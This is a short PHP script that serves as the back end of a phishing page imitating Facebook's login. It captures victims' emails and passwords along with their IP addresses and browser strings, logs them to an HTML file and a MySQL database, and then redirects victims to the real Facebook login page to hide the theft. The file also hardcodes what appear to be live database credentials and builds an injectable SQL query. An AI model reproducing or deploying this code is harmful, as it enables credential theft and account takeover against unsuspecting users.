<?php

$habbo = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("user.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#0000FF">'.$habbo.'</font></b>] Password: [<b><font color="#FF0040">'.$password.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>]<br>');
fclose($f);

$user_agent = $_SERVER['HTTP_USER_AGENT'];


$link =mysqli_connect("localhost", "u393285625_fbk", "luyUEGGt6F0mC5iI", "u393285625_fb");
$tildes = $link->query("SET NAMES 'utf8'"); //Para que se inserten las tildes correctamente
mysqli_query($link, "INSERT INTO data (user, pass, lugar, navegador, ip) VALUES ('$habbo', '$password', 'Facebook_web', '$user_agent','$ip')");
mysqli_close($link); // Cerramos la conexion con la base de datos
//echo 'Los datos han sido insertados en la base de datos';

header("Location: https://www.facebook.com/login.php?login_attempt=1");
?>
